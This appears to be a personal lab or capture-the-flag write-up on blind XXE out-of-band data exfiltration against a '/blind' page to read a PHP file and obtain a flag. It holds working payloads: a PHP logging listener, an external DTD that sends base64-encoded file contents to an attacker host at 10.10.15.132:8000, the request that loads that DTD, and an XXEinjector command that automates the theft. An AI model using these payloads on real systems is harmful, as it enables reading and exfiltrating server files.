# [Blind Data Exfiltration](Blind%20Data%20Exfiltration.md)
### Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.
## Out-of-band Data Exfiltration
#### First i need to prepare a `index.php`

```php
<?php 
if(isset($_GET['content'])){ 
	error_log("\n\n" . base64_decode($_GET['content'])); 
} 
?>
```
![](Screenshot%202026-07-24%20at%2015.44.26.png)

#### Then the payload `xxe.dtd`

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php"> 
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.132:8000/?content=%file;'>">
```

#### Everything done i moved to Burp and send request 

```xml
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://10.10.15.132:8000/xxe.dtd"> 
	%remote; 
	%oob; 
]> 
<root>&content;
```

#### Boom
![](Screenshot%202026-07-24%20at%2015.46.20.png)
#### Now decode a content and get the flag
![](Screenshot%202026-07-24%20at%2015.47.02.png)
___
## Automated OOB Exfiltration

#### Prepare a HTTP requets
![](Screenshot%202026-07-24%20at%2015.51.04.png)
#### Next i gonna use XXEInjection tool from Github

```shell
ruby XXEinjector.rb --host=10.10.15.132 --httpport=8000 --file=xxe.rq --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
```
![](Screenshot%202026-07-24%20at%2015.52.29.png)
#### Now cat the Logs
![](Screenshot%202026-07-24%20at%2015.53.47.png)
